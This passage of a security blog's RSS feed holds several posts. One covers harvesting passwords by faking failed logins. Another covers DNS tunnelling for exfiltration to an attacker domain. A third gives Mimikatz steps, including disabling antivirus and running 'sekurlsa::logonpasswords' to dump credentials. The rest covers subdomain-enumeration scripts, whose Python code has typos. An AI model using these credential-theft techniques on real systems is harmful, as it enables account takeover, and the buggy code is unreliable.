+            <content type="html"><![CDATA[<p><img src="/images/post7.jpeg" alt="image"></p>
+<p>The world is going passwordless. Meaning no more memorized secrets instead they make use of “possession factors”, like OTP or software-based authenticators(Authy, Google authenticator). The password-based authentication is coming to an end and adopting new changes will always benefit the security culture. But will it really end?</p>
+
+    <img src="https://media.giphy.com/media/xUNd9OAOrmD6UFGoCI/giphy.gif"  alt="Hello Friend"  class="center"  />
+
+
+<p>No, because it solely relies on the service providers and the user choices. If the website only provides password-based authentication methods then there is no other way but to remember the passwords. Password-based authentications are easy to implement and understand. No matter where a user is using the service from, after successful registration they can access various online services without any restriction using their username and password. Responsibility for password security rests with the user’s discretion. It is up to the user to change the passwords from time to time or use a stronger one. This behavior opens up a wide variety of attacks such as brute force, <a href="https://owasp.org/www-community/attacks/Credential_stuffing">credential stuffing</a>, and more. In this article, we will try to include most of the psychological and external factors that open the door to such attacks.</p>
+<h2 id="the-problem">The problem</h2>
+<p><img src="https://miro.medium.com/max/700/1*GYk9H9EAYweBs_51Zu4peA.png" alt="image"></p>
+<p>Passwords should not be easy to remember. The hardest password a normal person can think of is <em>username@123</em>. It is either username or something that you love in combination with your birth date or other common numbers that anyone can think of. This makes it easy to predict, crack and compromise your online accounts. Also, people use the same password on almost all sites.</p>
+<p>Online services being aware of such issues made it mandatory that your password should contain at least one uppercase, one lowercase, one special character, and numbers. Did this solve the issue? No. Instead, the end-user became smarter and evaded the password strength checker using <em>Username@123</em> instead of <em>username@123</em>. Having said all these issues, let&rsquo;s see how I would’ve stolen passwords with minimal effort.</p>
+<h2 id="stealing-passwords">Stealing passwords</h2>
+<blockquote>
+<p><em>For the sake of this article, I will use an imaginary website called example.com which is full of cat pictures and songs.</em></p>
+</blockquote>
+<p>Who says no to cats and good songs? we all love both. To access these unlimited services, a user must first register and use their registered email id and password to log in. It’s time to throw the dice of possibilities. From here itself there is a possibility of following events to occur,</p>
+<ul>
+<li>The user submitted the same password as the registered mail id.</li>
+<li>The same credentials are used on a different platform.</li>
+</ul>
+<p>Let&rsquo;s assume that our users are smart and they use different and strong passwords across platforms. So the above assumption is of no use, but it can happen. How can we steal the rest of the passwords used by the user?. Being an attacker means having the patience and skill to do certain tasks. So I will allow users to use the site for a while and then disable the login function with a login error message such as “Invalid username/password”. They will not be able to log in even if they try to log in with the correct credentials.</p>
+<p><img src="https://miro.medium.com/max/700/1*8F3ksKCE8dzc4kvhc-xF7Q.png" alt="image"></p>
+<p>But why? How can this benefit an attacker? Before answering these questions, let us understand the mistake we make in such situations. Most internet users tend to remember their passwords instead of using password managers. So when such errors are thrown at an end-user they will start brute-forcing log in with all the passwords they remember, and this applies to the mail id field if they have multiple emails. The user will end up sending all the remembered credentials to a specific server. The Forgot Password option is only used when all email password combos are exhausted. This causes multiple login attempts to be logged on the server-side.</p>
+<p><img src="https://miro.medium.com/max/700/1*RK3FSrUU0UNXsQRRydq15w.gif" alt="gif"></p>
+<p>As an attacker, by the time the user clicks on forgot password option, I will receive multiple mail IDs/passwords belonging to the same user on the server-side. I can make use of these collected passwords/mail IDs to create a perfect wordlist for credential stuffing attacks. Attempts to log in with this custom wordlist are more likely to be successful due to fewer duplicates and more accurate values. Since I also received multiple mail IDs, with OSINT tools I may be able to find the online services you registered with that mail ID and log in with the password already in my word list.</p>
+<h2 id="how-to-be-secure">How to be secure</h2>
+<ol>
+<li>
+<p>Use password managers — make use of password manager software like <a href="https://www.keepassx.org/">KeePass</a> and set up a very strong master password for the application.</p>
+</li>
+<li>
+<p>Use strong passwords,</p>
+<ul>
+<li>Is at least 12 characters long</li>
+<li>Includes a mix of numbers, symbols, capital letters, and lower-case letters</li>
+<li>Avoids using dictionary words or combinations of dictionary words</li>
+</ul>
+</li>
+<li>
+<p>Use passphrases instead of passwords.</p>
+</li>
+<li>
+<p>Change your password periodically across all services that you use.</p>
+</li>
+<li>
+<p>Never reuse your password.</p>
+</li>
+<li>
+<p>Use strong passphrases — instead of using “ThisIsMyStrongPassword” consider using “7H151SMy$7ronGP@55w0rd”.</p>
+</li>
+<li>
+<p>In doubt use forgot password functionality and set up a new password.</p>
+</li>
+</ol>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Hide &amp; Seek</title>
+            <link>https://scr1p7k1dd13.github.io/posts/2021/03/hide-seek/</link>
+            <pubDate>Fri, 12 Mar 2021 12:35:29 +0530</pubDate>
+            
+            <guid>https://scr1p7k1dd13.github.io/posts/2021/03/hide-seek/</guid>
+            <description>We all love playing Hide &amp;amp; Seek. A game we enjoyed playing in our childhood. The rules were so simple, one person would close their eyes and start counting (often counted as 50) while other players would hide. The seeker then opens his eyes and tries to find the hiders; the first to be found will become the next seeker, and the last is the winner of the round. There are different versions of the game in different regions but we’ll focus on this.</description>
+            <content type="html"><![CDATA[<p><img src="/images/post6.jpeg" alt="image"></p>
+<p>We all love playing Hide &amp; Seek. A game we enjoyed playing in our childhood. The rules were so simple, one person would close their eyes and start counting (often counted as 50) while other players would hide. The seeker then opens his eyes and tries to find the hiders; the first to be found will become the next seeker, and the last is the winner of the round. There are different versions of the game in different regions but we’ll focus on this. If you can hide until they find the last person, you can be a winner. Hiding is not an easy task. This also applies to security threats in the modern world. They use various evasion techniques or remain inactive until their intentions are fulfilled without any discovery. You know how difficult it is to bypass firewalls and modern security devices, so malware is never an easy task 😅. For the same reason, it is not easy to make a <em>C&amp;C</em> callback or exchange sensitive information.</p>
+<p>In this blog, we’ll discuss one of such evasion techniques called <strong>DNS Tunnelling</strong>. Long story short, I was reading about <a href="https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610">Dependency confusion</a> by Alex birsan and in his article on how he was able to exfiltrate information from tech giants including Apple, Paypal,…, he referred to the technique he used to transfer data from their system to a server. Which was of course DNS tunneling. An attack that had been there for some time and no one cared about it. This attack uses the DNS protocol to transfer data.</p>
+<p>But how ❔ How does he manage to send information using a protocol which was never intended to transfer data ❔</p>
+
+    <img src="https://media.giphy.com/media/3o7TKTDn976rzVgky4/giphy.gif"  alt="Hello Friend"  class="center"  />
+
+
+<h2 id="the-dns-protocol">The DNS Protocol</h2>
+<p>The Internet is basically a group of connected computers, each with its own IP identifier. If Computer B wants to communicate with Computer A, it must know A’s IP. It is like knowing the home address to receive an online package. So if you want to talk to a computer on the network, you need to know their lP. But there is a problem, humans are bad at math (accept it 😄). Nah.. just kidding. The problem is that we can&rsquo;t remember all these random numbers separated by dots(Eg: 192.168.1.1). To solve this issue, a new system was introduced called the DNS(Domain name system). Which basically resolves a given domain name to an IP.</p>
+<blockquote>
+<p>Stackoverflow.com :: 151.101.129.69</p>
+</blockquote>
+<p>DNS is like a big phone book, with the help of which you can call your friends without remembering their phone numbers. When you type a domain name into an address bar, such as medium.com, a set of actions takes place in the background.</p>
+<p><img src="https://miro.medium.com/max/700/1*d5A9u4YqJdxEJ61sDze03A.png" alt="image"></p>
+<p>It’s like going to a place where you don’t know the way and asking the locals for directions 😕. After typing in <em>medium.com</em>, the browser will issue a DNS lookup for the domain you typed in. This is basically checking if someone has the IP corresponding to <em>medium.com</em>. It will first check whether your local DNS server has a cached copy. If not it will forward the request to the next level the <em>Root name server</em>. This process will continue until the <em>Authoritative nameserver</em>. The authoritative server will be able to reply with the required IP, based on which further communication will take place. If you want to learn more about DNS refer to <a href="https://www.cloudflare.com/learning/dns/what-is-dns/">this</a> article.</p>
+<p>Now that we have an understanding of how DNS works, let&rsquo;s try to transfer data over DNS.</p>
+<p>Although this may seem unfair, I will use Burp Collaborator because I don’t want to buy a custom domain or make use of <a href="https://code.kryo.se/iodine/">iodine</a>,<a href="https://github.com/iagox86/dnscat2">dnscat</a> like tools.</p>
+<h2 id="dns-tunneling">DNS Tunneling</h2>
+<p>This method takes advantage of the fact that DNS requests to unknown, untrusted, or known bad domains and resources are often kept unfiltered.</p>
+<blockquote>
+<p>DNS packets contain many fields and headers in which data can be concealed.</p>
+</blockquote>
+<p><strong>Step#1</strong>:: Start your burp collaborator instance.</p>
+<p><img src="https://miro.medium.com/max/700/1*S-2Ta9DuGkKBQVYMgUS2fQ.png" alt="image"></p>
+<p><strong>Step#2</strong>:: Copy collaborator client URL. Add random values before the copied URL. i.e, if your collaborator URL is <em><em>zcfe44hkzgcqhbnohna30196fxlq9f.burpcollaborator.net</em></em> then change it to mysecret.zcfe44hkzgcqhbnohna30196fxlq9f.burpcollaborator.net. Paste it in the browser address bar and hit enter.</p>
+<p><img src="https://miro.medium.com/max/700/1*qye3U3ydBrAIpNTPf-6N4g.png" alt="image"></p>
+<p><strong>Step#3</strong>:: Analyze collaborator interactions for DNS requests.</p>
+<p><img src="https://miro.medium.com/max/700/1*sqU7BYOAvtcoUIknG-rOkA.png" alt="image"></p>
+<p>As you can see, a DNS lookup request was made for the domain we just entered. You can add data to a DNS lookup request, even an encoded payload.</p>
+<p>Likewise, an attacker with a custom DNS server and access to your system can act as an authoritative server to handle requests to various subdomains. Any DNS request made by the victim to “{data}.attacker.com” will end up reaching the attacker’s machine. The attacker can then respond to the victim’s DNS request enabling a bidirectional data transfer channel.</p>
+<p>However, some of you may be skeptical. This does not make sense, because what we have just done is basically trying to resolve a Sub-subdomain that does not exist. Normally, the request will show an error page indicating “<em>This site can’t be reached</em>”. The reason why this does not happen is because of the following Burp Collaborator features:</p>
+<ul>
+<li>It uses its own dedicated domain name, and the server is registered as the authoritative DNS server for this domain.</li>
+<li>It provides a DNS service that answers any lookup on its registered domain (or subdomains) with its own IP address.</li>
+</ul>
+<p>So we can add any data in front of the generated collaborator ID and still receive a callback 👌.</p>
+<p>Similarly, if a user makes a request for an anonymous domain name in a protected environment, it will eventually leave the environment because it needs to be resolved to an IP.</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>The cute cat</title>
+            <link>https://scr1p7k1dd13.github.io/posts/2021/03/the-cute-cat/</link>
+            <pubDate>Wed, 03 Mar 2021 12:35:23 +0530</pubDate>
+            
+            <guid>https://scr1p7k1dd13.github.io/posts/2021/03/the-cute-cat/</guid>
+            <description>The world is changing so does technology. We can see a change of ten years in just one year. The technology is changing so rapidly that even recruiters don’t know how to recruit to a new post.
+But, are we making use of up-to-date configurations and software❓
+You may be wondering if I’m going to discuss cats in this blog. Yes, we are going to talk about something different but interesting.</description>
+            <content type="html"><![CDATA[<p><img src="/images/post5.jpeg" alt="image"></p>
+<p>The world is changing so does technology. We can see a change of ten years in just one year. The technology is changing so rapidly that even recruiters don’t know how to recruit to a new post.</p>
+
+    <img src="/images/ss.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;border:1px black solid;"  />
+
+
+<p>But, are we making use of up-to-date configurations and software❓</p>
+<p>You may be wondering if I’m going to discuss cats in this blog. Yes, we are going to talk about something different but interesting. We are going to discuss an interesting tool the “<em>Mimikatz</em>”(cute cats in french 😸). Mimikatz is a program developed in C by <a href="https://github.com/gentilkiwi">Benjamin Delpy</a>. It is a post-exploitation tool that can recover passwords from memory, hashes, PINs, and Kerberos tickets. Not only that, it can perform attacks like pass-the-hash, pass-the-ticket, or building Golden Kerberos tickets. It is one of the best tools to gather such sensitive information from Windows systems. How is this even possible? How does the tool retrieve this sensitive information? Because windows tend to store credentials as hashed values in the SAM file.</p>
+<h2 id="the-root-cause">The root cause</h2>
+<p>On versions of Windows 7 to 8, after a user logs on, a variety of credentials are generated and stored in memory including Kerberos tickets, NTLM hashes, passwords (weird 😕) in order to facilitate SSO(single sign-on) to all the resources. While Windows keeps the copy of the user’s password encrypted, it also keeps a copy of the secret key to decrypt it in memory. Just like leaving your door keys under the carpet 😅.</p>
+
+    <img src="https://media.giphy.com/media/lkdH8FmImcGoylv3t3/giphy.gif"  alt="Hello Friend"  class="center"  style="width:450px;height:350px;"  />
+
+
+<p>Since both the secret and the key are stored in memory, there is no doubt about how a tool can decrypt this information. In order to retrieve the secrets, Mimikatz exploits a process responsible for enforcing security policy in windows systems. The Local Security Authority Subsystem Service (LSASS) stores credentials in memory on behalf of users with active Windows sessions. The stored credentials let users seamlessly access network resources, such as file shares without re-entering their credentials for each remote service. By locating the LSA secrets key, and decrypting the sections in memory where credentials are stored the tool is able to dump all the sensitive data.</p>
+<h2 id="installation">Installation</h2>
+<blockquote>
+<p><em>Assumption : You are using windows version 7 or 8.</em></p>
+</blockquote>
+<p><strong>Step1</strong>:: Head over to the <a href="https://github.com/gentilkiwi/mimikatz">Mimikatz Github repo</a>.</p>
+<p><img src="https://miro.medium.com/max/700/1*EMvBts99Cm7iBTMFFF64nA.png" alt="image"></p>
+<p><strong>Step2</strong>:: Click on <a href="https://github.com/gentilkiwi/mimikatz/releases">releases</a> and download the latest mimikatz_trunk.zip file.</p>
+<blockquote>
+<p><em>Note: In order to download the file one must disable the AV in the system. If you are not using one make sure you disabled windows defender. Because this file will be flagged malicious and removed.</em></p>
+</blockquote>
+<p><img src="https://miro.medium.com/max/700/1*--Uun0NKNvffjR1XfOdpIA.png" alt="image"></p>
+<p><strong>Step3</strong>:: Once downloaded extract the contents of the zip file in a folder of your preference.</p>
+<p><img src="https://miro.medium.com/max/700/1*MGncWj4IqJLxf_-AOSJBhQ.png" alt="image"></p>
+<p><strong>Step4</strong>:: Mimikatz supports both x32 and x64 architectures. So choose the appropriate folder.</p>
+<p><img src="https://miro.medium.com/max/700/1*-rC4549cRV454xKeje6kpQ.png" alt="image"></p>
+<p><strong>Step5</strong>:: After clicking on the appropriate folder, right-click on the Mimikatz file and run the tool as administrator(Because this tool has to run with administrator or system privileges to work properly).</p>
+<p><img src="https://miro.medium.com/max/700/1*9YaRlQuxvhWYER_vyNUVzA.png" alt="image"></p>
+<p><img src="https://miro.medium.com/max/700/1*vWlknGyDNNGQabBZuO2akQ.png" alt="image"></p>
+<h2 id="the-treassure">The treassure</h2>
+<p>Now that we are able to run the tool it is time to dig out the treasure(sensitive info). Let&rsquo;s first understand the basic commands supported by the tool.</p>
+<p><img src="https://miro.medium.com/max/700/1*wfsug021cKXaXGDNFVgO-Q.png" alt="image"></p>
+<p>So far so good. Let’s try to retrieve the password. The process of extracting clear text passwords starts by invoking the debug command from the privilege module. Type in the command,</p>
+<blockquote>
+<p><em>privilege::debug</em></p>
+</blockquote>
+<p><img src="https://miro.medium.com/max/700/1*Xs1ZgF-FGzBwIoneKo5nsQ.png" alt="image"></p>
+<blockquote>
+<p>Note: If you want to keep a log of the interactions with mimikatz then you can simply use the <em>log</em> command to keep a log.</p>
+</blockquote>
+<p>After invoking the privilege module (make sure you got status code 20 as output) you are ready to extract the clear text passwords. Enter,</p>
+<blockquote>
+<p><em>sekurlsa::logonpasswords</em></p>
+</blockquote>
+<p>This command will extract the user id and password of the currently logged-in user.
+<img src="https://miro.medium.com/max/700/1*NCxLTVN6X4ThnEeFqWFAiw.png" alt="image"></p>
+<p>As you can see we’ve successfully dumped the credentials corresponding to the currently logged-in user. Here the username is “Error-404” and the password is “<em>scriptkiddie</em>”. The Values corresponding to LM and NTLM are the hashed values of the password. These hashes are considered weak since they can be brute-forced very easily with modern hardware. You could make use of online tools like <a href="https://crackstation.net/">crackstation</a> or any other offline tool (Hashcat) to find the original value.</p>
+<p>There are various interesting <a href="https://github.com/gentilkiwi/mimikatz/wiki#modules">modules</a> in Mimikatz including <em>crypto, token, and even a Winmine</em> module to find hidden mines in the classic minesweeper game 🎮. Considering the importance of the tool in post-exploitation Metasploit comes with Mimikatz as one of its modules.</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Subdomain Enumeration:Build yourn own tool</title>
+            <link>https://scr1p7k1dd13.github.io/posts/2021/02/subdomain-enumerationbuild-yourn-own-tool/</link>
+            <pubDate>Fri, 26 Feb 2021 10:27:43 +0530</pubDate>
+            
+            <guid>https://scr1p7k1dd13.github.io/posts/2021/02/subdomain-enumerationbuild-yourn-own-tool/</guid>
+            <description>Hello security enthusiasts welcome to yet another blog. In this blog, we will learn how to create a simple subdomain enumeration tool with python. Subdomain enumeration is a critical step in recon since understanding digital assets play a major role in every pentest activity. For the same, we have a various set of tools and techniques created by awesome people in the hacking community. Sublister, Amass, and the list goes on.</description>
+            <content type="html"><![CDATA[<p><img src="/images/post4.jpeg" alt="image"></p>
+<p>Hello security enthusiasts welcome to yet another blog. In this blog, we will learn how to create a simple subdomain enumeration tool with python. Subdomain enumeration is a critical step in recon since understanding digital assets play a major role in every pentest activity. For the same, we have a various set of tools and techniques created by awesome people in the hacking community. Sublister, Amass, and the list goes on. But my question is “Do you have one of your own?”. If your answer is no, then it should not come as a big surprise to me. Because we are from different backgrounds, some may know how to code, some may not be interested in coding, and some may prefer to use a custom tool. Anyway, let’s see if we can build a simple tool with basic Python knowledge.</p>
+<h2 id="the-source">The source</h2>
+<p>Yes, we need some source to fetch or scrape the required information. Most of the modern tools try to scrape already existing webpages or make use of open-source API calls to fetch this information. In this case, we will make use of <a href="">crt.sh</a>. It is an online database of certificate transparency logs. To find the certificates issued to a particular domain, you just have to input the domain name and hit enter. It will pull out all the logged information related to that particular domain.</p>
+<p><img src="https://miro.medium.com/max/700/1*ZSHikwKBUOhnALIYBNzU4w.png" alt="image"></p>
+<p>However, going to a website and searching isn’t always convenient, and this will consume more time as compared to an automated tool output. For more complex queries, crt.sh offers direct database access, and custom PostgreSQL queries but we are not going to talk about that here. What we’ll be focusing on will be how to extract relevant information from the table that is already presented to us.</p>
+<h2 id="the-logic">The logic</h2>
+<p>Since we have the source it’s time to implement the logic. Let’s first analyze the request. It is a basic <em>GET</em> request to <a href="https://crt.sh/?q=domain">https://crt.sh/?q=domain</a> and you get the results. Upon analyzing the response (webpage) you might have noticed that for details regarding subdomain we only need information from the 5th and 6th column and if we don’t care about CNMAE then it narrow down to the 6th column specifically. If we could somehow parse the response, delete the unwanted items, and remove duplicate entries then we might have what we are looking for.</p>
+<h2 id="the-code">The code</h2>
+<p>Now we know how the tool should work it&rsquo;s time to code. Let’s see the necessary python libraries to satisfy our needs.</p>
+<ol>
+<li><em>requests</em> library for HTTP requests and responses</li>
+<li><em>sys</em> module to pass arguments from the command line. Because no good tool uses hard-coded information.</li>
+<li><em>re</em> the Regular Expression library for match and replace. Trust me this library does the magic.</li>
+</ol>
+<p>The first part will be importing all the required libraries. Which goes by the syntax</p>
+<blockquote>
+<p><em>import library-name</em></p>
+</blockquote>
+<p>You could import all the libraries in a single line by mentioning them as comma-separated values. But we will import them separately 😄</p>
+<pre><code>    import sys
+
+    import requests
+
+    import re
+</code></pre><p>The first step will be to send a GET request with the passed domain name to <a href="https://crt.sh/?q=">https://crt.sh/?q=</a>. For that, we’ll make use of the requests library and the syntax will be</p>
+<blockquote>
+<p><em>requests.get(“https://crt.sh/?q=”)</em></p>
+</blockquote>
+<p>But we are not bothered about the request what we need is the response that we got for the query. It is also simple,</p>
+<blockquote>
+<p><em>response = requests.get(“https://crt.sh/?q=”)</em></p>
+</blockquote>
+<p>In the above code, we are saving the response for our request to the response variable. Also, we don’t want to issue an empty query we need to input the domain name and it should be accepted from the command line (from where the tool is run). For that, we will pass the domain name.</p>
+<pre><code>    import sys
+
+    import requests
+
+    import re
+
+    response = requests.get(“https://crt.sh/?q=”+sys.argv[1])
+</code></pre><p>Here we are issuing a <em>GET</em> request with the first argument passed from the command line(sys.argv[1]). Now let’s analyze the response we got for the same. For that, add the print(response.text) to the bottom of the code.</p>
+<pre><code>    import sys
+
+    import requests
+
+    import re
+
+    response = requests.get(“https://crt.sh/?q=”+sys.argv[1])
+
+    print(response.text)
+</code></pre><p>Because if you just print the response then it will only give you the status code which is 200 in this case. In order to retrieve the webpage source we needed, we must specify it as response.text. Now let’s analyze the response for tesla.com</p>
+<p><img src="https://miro.medium.com/max/700/1*CvgUNgznoAK1Up2FoEyOFA.png" alt="image"></p>
+<p>You might’ve already noticed the information we needed lies on the table cell. If we could somehow extract only this information then our tool will be almost done.</p>
+<p>It is time for the regular expression. We’ll search for valid domain names in the output that we got. For that, we’ll pass the above response as a string (because re expects string input) to <em>re.findall()</em> function which literally searches for a given regex in the provided string.</p>
+<pre><code>    import sys
+
+    import requests
+
+    import re
+
+    response = requests.get(“https://crt.sh/?q=”+sys.argv[1])
+
+    mylist = re.findall(‘(?:[a-z0–9](?:[a-z0–9-]{0,61}[a-z0–9])?\.)+[a-z0–9][a-z0–9-]{0,61}[a-z0–9]’,str(response.text))
+</code></pre><p><img src="https://miro.medium.com/max/700/1*Yd_FlFXDWeDz-ojNmFMbAw.png" alt="image"></p>
+<p>We pass the response to the regular expression to extract only valid domain names. As you can see after this step we are left with a list of domain names. Now it is time to remove duplicates. We’ll make use of the dict.formkeys() method to remove redundant entries from the list.</p>
+<pre><code>    import sys
+
+    import requests
+
+    import re
+
+    response = requests.get(“https://crt.sh/?q=”+sys.argv[1])
+
+    mylist = re.findall(‘(?:[a-z0–9](?:[a-z0–9-]{0,61}[a-z0–9])?\.)+[a-z0–9][a-z0–9-]{0,61}[a-z0–9]’,str(response.text))
+
+    mylist = list(dict.formkeys(mylist))
+</code></pre><p><img src="https://miro.medium.com/max/700/1*BAPlrgivDLe4xa2ymlS9kw.png" alt="image"></p>
+<p>The new dictionary will then be converted back to a list using the list() method. Now we will rollback the list to string and print each entry in a different line using <em>join()</em>.</p>
+<pre><code>    import sys
+
+    import requests
+
+    import re
+
+    response = requests.get(“https://crt.sh/?q=”+sys.argv[1])
+
+    mylist = re.findall(‘(?:[a-z0–9](?:[a-z0–9-]{0,61}[a-z0–9])?\.)+[a-z0–9][a-z0–9-]{0,61}[a-z0–9]’,str(response.text))
+
+    mylist = list(dict.formkeys(mylist))
+
+    print(“\n”,join(mylist))
+</code></pre><p>All set. Time to run the code 😅.</p>
+<blockquote>
+<p><em>python crt.py tesla.com</em></p>
+</blockquote>
+<p><img src="https://miro.medium.com/max/700/1*3halfo9fwbAa8kh1G6JoKg.png" alt="image"></p>
+<p>As you can see all the relevant subdomains are enumerated within seconds with only seven lines of code 😄. But, there is a problem. If you’ve noticed for the regular expression td.text &amp; th.outer (HTML properties) are also a valid domain name. How to remove these? since we don’t want this to be included in our final list. One way is to identify all the list items that has “.com” as part of it and retrieve only those information.It’s is not a complete solution but for the sake of this tutorial we are gonna make use of it. We’ll retrieve the TLD from the input argument and try retrieving only those list items which contain that as a substring. We need to first identify the TLD from input argument. If you are passing domain.com as input then our TLD variable must contain the value ‘.com’.</p>
+<blockquote>
+<p><em>TLD = sys.argv[1].partition(‘.’)</em></p>
+</blockquote>
+<p>The above code will split our input as [‘domain’ , ’.’ , ’com’] and we only need the third item or simply TLD[2].</p>
+<blockquote>
+<p><em>TLD = ‘.’+TLD[2]</em></p>
+</blockquote>
+<p>Finally we will concatenate the same with a ‘.’ since we will be searching for ‘.com’ substring. For searching the substring in our list we will use,</p>
+<blockquote>
+<p><em>mylist = [x for x in mylist if all(ch in x for ch in TLD)]</em></p>
+</blockquote>
+<p>Adding this in our enumeration tool will remove all the unwanted items and give a better output.</p>
+<pre><code>    import sys
+
+    import requests
+
+    import re
+
+    TLD = sys.argv[1].partition(‘.’)
+
+    TLD = ‘.’+TLD[2]
+
+    response = requests.get(“https://crt.sh/?q=”+sys.argv[1])
+
+    mylist = re.findall(‘(?:[a-z0–9](?:[a-z0–9-]{0,61}[a-z0–9])?\.)+[a-z0–9][a-z0–9-]{0,61}[a-z0–9]’,str(response.text))
+
+    mylist = [x for x in mylist if all(ch in x for ch in TLD)]
+
+    mylist = list(dict.formkeys(mylist))
+
+    print(“\n”,join(mylist))
+
+</code></pre><p>And that’s it. That is all we needed for our subdomain enumeration tool. You could simply input any domain and have a list of subdomains 😉.</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>The Time Eater</title>
+            <link>https://scr1p7k1dd13.github.io/posts/2021/02/the-time-eater/</link>
+            <pubDate>Tue, 23 Feb 2021 10:27:39 +0530</pubDate>
+            
+            <guid>https://scr1p7k1dd13.github.io/posts/2021/02/the-time-eater/</guid>
+            <description>Automating the manual workflow is a great task. This allows us to reduce the time it takes to perform tasks that may take a long time to complete. In penetration testing also we have a wide variety of tools to serve various purposes. For example, let’s consider Recon. If you want to perform recon on targets that have a large scope the initial step will be identifying its digital assets including subdomains, IP’s, etc…But if we don’t have the right tools to do this we will have to use search engine dorks and browse through all the results manually.</description>
+            <content type="html"><![CDATA[<p><img src="/images/post3.jpeg" alt="image"></p>
+<p>Automating the manual workflow is a great task. This allows us to reduce the time it takes to perform tasks that may take a long time to complete. In penetration testing also we have a wide variety of tools to serve various purposes. For example, let’s consider Recon. If you want to perform recon on targets that have a large scope the initial step will be identifying its digital assets including subdomains, IP’s, etc…But if we don’t have the right tools to do this we will have to use search engine dorks and browse through all the results manually. Which might take ages to complete.</p>
+<p>We use some tools to simplify these tasks and get them done in less time. Tools like <a href="https://github.com/projectdiscovery/subfinder"><em>subfinder</em></a> or <a href="https://github.com/aboul3la/Sublist3r"><em>sublister</em></a> come in handy during subdomain enumeration. These tools will produce only those results we wanted to see.</p>
+<p>But the question is “are we using it efficiently”❓</p>
+<p>Suppose I want to enumerate subdomains of <em>target.com</em> and take a snap of all the identified subdomains. Rather than relying on a single tool, I tend to make use of multiple tools for the same purpose. Because different tools employ different methods so the output will also differ. For finding subdomains I might make use of <a href="https://github.com/aboul3la/Sublist3r"><em>sublister</em></a>,<a href="https://github.com/projectdiscovery/subfinder"><em>subfinder</em></a>, and <a href="https://github.com/OWASP/Amass"><em>Amass</em></a>.</p>
+<blockquote>
+<p><em>sublister -d target.com</em></p>
+</blockquote>
+<p>Then I will merge the outputs from tools into a single file and sort it for uniqueness. After this process, we will be left with a good list of all the possible subdomains of target.com. The next step is to take the screenshot for that I make use of <a href="https://github.com/sensepost/gowitness">gowitness</a>. But there is a problem, We can’t feed the output of enumeration tools to gowitness since it requires a fully-qualified URL as input. For that, we might need to add leading https:// to every line in the list using match and replace or by taking advantage of any other tool.</p>
+<blockquote>
+<p><em>gowitness file -s output.txt</em></p>
+</blockquote>
+<p>This will generate the output I needed but the problem is it consumes more time. Running tools from their respective directories, Finding subdomains then merging into a single one, sorting it, adding leading string, and finally taking the screenshot might take 5–10 minutes. Automated tools are made to reduce the time taken to perform a task and now we are spending time running these tools.</p>
+<p>How to solve this?</p>
+<p><img src="https://media.giphy.com/media/a5viI92PAF89q/giphy.gif" alt="gif"></p>
+<p>Well, we can write a tool to run other tools. Yes, let’s see how we could have handled the above scenario just by running a single tool. First, let’s understand how the tool should work</p>
+<ol>
+<li>It should take the domain name as input.</li>
+<li>It should enumerate all the possible subdomains of the supplied domain and save the output.</li>
+<li>The output should be consolidated and sorted.</li>
+<li>The tool should take screenshots of the identified domains.</li>
+<li>All these outputs should be saved into specific folders generated at runtime.</li>
+</ol>
+<p>Now that we have an idea about how the tools should work let’s see how we can make it possible. The tool will be developed using shell scripting.</p>
+<h2 id="subscanner">Subscanner</h2>
+<p>Developing tools using shell scripting is easy since it can directly issue system commands once run.</p>
+<p><strong>Step#1</strong>:: Laying out the basics.</p>
+<p>In this step, we will identify the basic commands to be executed. We will be making use of sublister and subfinder for subdomain enumeration, httpx for checking live websites, sort command for sorting the output file, and finally gowitness for screenshot taking. Without further ado Let’s start writing the code,</p>
+<h3 id="subdomain-enumeration">Subdomain Enumeration</h3>
+<pre><code>#!/bin/sh
+sublister -d target.com -t 50 -o output.txt &amp; subfinder -d target.com &gt;&gt; output.txt
+</code></pre><p>In this step, we are instructing the interpreter to execute both commands at the same time. i.e, both sublister and subfinder will be run at the same time(‘&amp;’). Sublister will be run with 50 threads and the output will be saved to output.txt. Since sublister is writing into output.txt we can’t simply direct the subfinder to do the same because it will overwrite the existing data written by sublister. For that, we have added ‘&raquo;’ i.e, we’re appending data to an existing file.</p>
+<p><em>output:<em>.target.com (</em> can be anything)</em></p>
+<h3 id="sorting">Sorting</h3>
+<pre><code>    #!/bin/sh
+
+    sublister -d target.com -t 50 -o output.txt &amp; subfinder -d target.com &gt;&gt; output.txt
+
+    sort -u -o output.txt output.txt
+</code></pre><p>After getting the output.txt the next step is to sort the output and delete duplicates if exist. For that, we’ll make use sort command available in Linux. The -u flag directs the command to sort for unique values i.e, basically delete duplicate entries. The -o flag is for outputting to a file. In this case, we’ll be reading from and writing to the same file.</p>
+<h3 id="addinfg-leading-string">Addinfg leading string</h3>
+<pre><code>    #!/bin/sh
+
+    sublister -d target.com -t 50 -o output.txt &amp; subfinder -d target.com &gt;&gt; output.txt
+
+    sort -u -o output.txt output.txt
+
+    cat output.txt | httpx -o output.txt
+</code></pre><p><a href="https://github.com/projectdiscovery/httpx">httpx</a> is a great tool by projectdiscovery which is basically used to check whether the input is giving an HTTP response or not. We use it to check whether the input is running a server or not. But in this case, we will be using it to have leading https:// in our output.txt as the input to gowitness has to be a complete URL. To add that we feed our output.txt to httpx and save back its output to output.txt itself.</p>
+<p><em>output: https://*.target.com</em></p>
+<h3 id="taking-screenshot">Taking screenshot</h3>
+<pre><code>    #!/bin/sh
+
+    sublister -d target.com -t 50 -o output.txt &amp; subfinder -d target.com &gt;&gt; output.txt
+
+    sort -u -o output.txt output.txt
+
+    cat output.txt | httpx -o output.txt
+
+    gowitness -T 5 file -s output.txt -d /screenshot
+</code></pre><p>gowitness is a tool written in go that does the same as <a href="https://github.com/FortyNorthSecurity/EyeWitness">EyeWitness</a>(if you are familiar with it). It basically takes a URL as an input and starts issuing requests to the same then it takes screenshots based on the response it got. It reads the lines from output.txt and saves the taken snaps to /screenshot folder. The -T 5 flag directs the tool to wait for 5 seconds until it time-out.</p>
+<p><strong>Step#2</strong>:: Reading inputs</p>
+<p>Perfect. Now that we have the idea and commands to be executed let’s see how we can take command line arguments as input to our tool.
+No matter what the tool name is it should be able to execute the command with a basic call which looks like,</p>
+<blockquote>
+<p><em>subscan.sh target.com</em>
